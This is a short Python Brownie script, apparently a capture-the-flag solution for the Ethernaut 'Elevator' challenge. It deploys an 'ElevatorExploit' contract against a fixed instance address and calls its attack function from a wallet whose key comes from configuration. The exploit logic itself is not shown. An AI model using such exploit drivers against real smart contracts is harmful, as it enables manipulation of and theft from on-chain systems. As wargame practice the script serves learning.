from brownie import Elevator, ElevatorExploit, config, accounts

instanceAddress = "0xc3b55973FADC6517B1a1C08367AD02c7fD41E66A"

player = accounts.add(config["wallets"]["from_key"]) 

def main():
    elevator = Elevator.at(instanceAddress)
    elevatorExploit = ElevatorExploit.deploy(instanceAddress, {"from": player})
    elevatorExploit.atk({"from":player})
